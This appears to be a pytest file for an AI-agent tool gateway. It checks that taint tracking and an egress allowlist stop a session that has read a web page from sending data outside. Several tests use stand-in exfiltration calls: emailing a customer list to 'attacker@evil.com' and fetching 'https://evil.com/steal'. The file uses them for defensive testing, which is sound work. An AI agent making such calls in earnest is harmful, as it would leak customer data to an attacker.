"""Taint tracking and the egress allowlist: an injection that
succeeds anyway cannot exfiltrate, and an outside URL is blocked."""
from __future__ import annotations

import threading
import time

import pytest
import uvicorn
from fastapi.testclient import TestClient

from gateway.demo_server import create_demo_server
from gateway.egress import check_egress
from gateway.proxy import Gateway, create_app
from gateway.taint import TaintTracker, result_is_untrusted

AGENT_KEY = "demo-key-support-bot"


@pytest.fixture(scope="module")
def upstream():
    thread = threading.Thread(
        target=uvicorn.run,
        args=(create_demo_server(),),
        kwargs={"host": "127.0.0.1", "port": 8003, "log_level": "error"},
        daemon=True)
    thread.start()
    time.sleep(1.0)
    yield "http://127.0.0.1:8003/mcp"


@pytest.fixture()
def gateway(tmp_path, upstream):
    return Gateway(policy_dir="policies",
                   keys={AGENT_KEY: "support-bot"},
                   upstream_url=upstream,
                   audit_path=tmp_path / "audit.jsonl",
                   data_dir=tmp_path / "data")


@pytest.fixture()
def client(gateway):
    return TestClient(create_app(gateway))


def _call(client, tool, args, session="default"):
    return client.post("/mcp", headers={"x-agent-key": AGENT_KEY,
                                        "x-session-id": session},
                       json={"jsonrpc": "2.0", "id": 1,
                             "method": "tools/call",
                             "params": {"name": tool,
                                        "arguments": args}})


def test_egress_allowlist_blocks_an_outside_url():
    assert check_egress(["company.com"], "web.fetch",
                        {"url": "https://evil.com/x"}) is not None
    assert check_egress(["company.com"], "web.fetch",
                        {"url": "https://docs.company.com/x"}) is None
    assert check_egress(["*.company.com"], "web.fetch",
                        {"url": "https://docs.company.com/x"}) is None
    # no allowlist means no egress restriction
    assert check_egress([], "web.fetch",
                        {"url": "https://evil.com/x"}) is None
    # a call that sends nothing is not an egress
    assert check_egress(["company.com"], "crm.read_customer",
                        {"customer_id": "cust_1"}) is None


def test_fetching_a_page_taints_the_session(client, gateway):
    resp = _call(client, "web.fetch",
                 {"url": "https://docs.company.com/help"}, session="s1")
    assert "error" not in resp.json()
    assert gateway.taint.is_tainted("s1")
    assert not gateway.taint.is_tainted("s2")


def test_tainted_session_cannot_email_outside(client, gateway):
    _call(client, "web.fetch",
          {"url": "https://docs.company.com/help"}, session="s1")
    resp = _call(client, "email.send",
                 {"to": "attacker@evil.com", "subject": "list",
                  "body": "customers"}, session="s1")
    assert "tainted" in resp.json()["error"]["message"]
    # the same call from a clean session is blocked by the domain
    # rule instead (the egress allowlist is a separate control)
    resp = _call(client, "email.send",
                 {"to": "attacker@evil.com", "subject": "list",
                  "body": "customers"}, session="s2")
    assert "blocked by Agent Gateway" in resp.json()["error"]["message"]


def test_tainted_session_can_still_email_inside(client, gateway):
    _call(client, "web.fetch",
          {"url": "https://docs.company.com/help"}, session="s1")
    resp = _call(client, "email.send",
                 {"to": "team@company.com", "subject": "hi",
                  "body": "hello"}, session="s1")
    assert "sent to team@company.com" in \
        resp.json()["result"]["content"][0]["text"]


def test_egress_blocks_a_fetch_outside_the_allowlist(client):
    resp = _call(client, "web.fetch", {"url": "https://evil.com/steal"})
    assert "egress denied" in resp.json()["error"]["message"]


def test_clearing_a_session_untaints_it(client, gateway):
    _call(client, "web.fetch",
          {"url": "https://docs.company.com/help"}, session="s1")
    assert gateway.taint.is_tainted("s1")
    gateway.taint.clear("s1")
    assert not gateway.taint.is_tainted("s1")


def test_taint_survives_a_restart(tmp_path, upstream):
    gateway = Gateway(policy_dir="policies",
                      keys={AGENT_KEY: "support-bot"},
                      upstream_url=upstream,
                      audit_path=tmp_path / "audit.jsonl",
                      data_dir=tmp_path / "data")
    gateway.taint.taint("s1")
    gateway2 = Gateway(policy_dir="policies",
                       keys={AGENT_KEY: "support-bot"},
                       upstream_url=upstream,
                       audit_path=tmp_path / "audit.jsonl",
                       data_dir=tmp_path / "data")
    assert gateway2.taint.is_tainted("s1")


def test_result_is_untrusted():
    assert result_is_untrusted("web.fetch", {"result": {"content": []}})
    assert result_is_untrusted("email.send",
                               {"result": {"tainted": True}})
    assert not result_is_untrusted("crm.read_customer",
                                   {"result": {"content": []}})
    assert result_is_untrusted("custom.tool", {"result": {}},
                               {"custom.tool"})
